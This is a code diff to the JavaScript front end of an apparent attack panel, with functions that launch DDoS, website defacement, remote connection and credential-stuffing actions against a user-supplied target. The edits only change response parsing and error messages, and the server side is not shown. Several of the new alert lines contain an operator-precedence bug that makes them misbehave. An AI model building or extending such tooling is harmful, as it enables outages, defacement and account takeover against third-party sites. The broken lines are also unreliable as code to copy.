@@ -11,7 +11,11 @@ async function fetchData(url, options) {
             const message = `An error occurred: ${response.status}`;
             throw new Error(message);
         }
-        return await response.json();
+        try {
+            return await response.json();
+        } catch (e) {
+            return await response.text();
+        }
     } catch (error) {
         console.error('Fetch error:', error);
         alert('Fetch error: ' + error.message);
@@ -35,10 +39,10 @@ async function startDDoS() {
             body: `target=${encodeURIComponent(target)}&attackType=ddos`
         });
 
-        if (data && data.status === 'success') {
+        if (typeof data === 'object' && data !== null && data.status === 'success') {
             updateStatistics(data);
         } else {
-            alert('DDoS attack failed: ' + (data ? data.message : 'Unknown error'));
+            alert('DDoS attack failed: ' + (typeof data === 'object' && data !== null && data.message) ? data.message : data);
         }
     } catch (error) {
         console.error('DDoS error:', error);
@@ -63,10 +67,11 @@ async function startDefacement() {
             body: `target=${encodeURIComponent(target)}&attackType=defacement&content=${encodeURIComponent(content)}`
         });
 
-        if (data && data.status === 'success') {
+        if (typeof data === 'string' && data.includes('Defacement successful')) {
             alert('Defacement successful!');
-        } else {
-            alert('Defacement failed: ' + (data ? data.message : 'Unknown error'));
+        }
+         else {
+            alert('Defacement failed: ' + (typeof data === 'object' && data !== null && data.message) ? data.message : data);
         }
     } catch (error) {
         console.error('Defacement error:', error);
@@ -91,10 +96,10 @@ async function establishConnection() {
             body: `target=${encodeURIComponent(target)}&attackType=connection&port=${encodeURIComponent(port)}`
         });
 
-        if (data && data.status === 'success') {
+        if (typeof data === 'string' && data.includes('Connection established')) {
             alert('Connection established!');
         } else {
-            alert('Connection failed: ' + (data ? data.message : 'Unknown error'));
+            alert('Connection failed: ' + (typeof data === 'object' && data !== null && data.message) ? data.message : data);
         }
     } catch (error) {
         console.error('Connection error:', error);
@@ -119,10 +124,10 @@ async function startCredentialStuffing() {
             body: `target=${encodeURIComponent(target)}&attackType=credentialStuffing&credentials=${encodeURIComponent(credentials)}`
         });
 
-        if (data && data.status === 'success') {
+        if (typeof data === 'string' && data.includes('Credential stuffing started')) {
             alert('Credential stuffing started!');
         } else {
-            alert('Credential stuffing failed: ' + (data ? data.message : 'Unknown error'));
+            alert('Credential stuffing failed: ' + (typeof data === 'object' && data !== null && data.message) ? data.message : data);
         }
     } catch (error) {
         console.error('Credential stuffing error:', error);
@@ -131,8 +136,10 @@ async function startCredentialStuffing() {
 }
 
 function updateStatistics(data) {
-    document.getElementById('mbps').innerText = data.mbps || 'N/A';
-    document.getElementById('packets-sent').innerText = data.packetsSent || 'N/A';
-    document.getElementById('target-status').innerText = data.targetStatus || 'N/A';
-    document.getElementById('time-elapsed').innerText = data.timeElapsed || 'N/A';
+    if (typeof data === 'object' && data !== null) {
+        document.getElementById('mbps').innerText = data.mbps || 'N/A';
+        document.getElementById('packets-sent').innerText = data.packetsSent || 'N/A';
+        document.getElementById('target-status').innerText = data.targetStatus || 'N/A';
+        document.getElementById('time-elapsed').innerText = data.timeElapsed || 'N/A';
+    }
 }
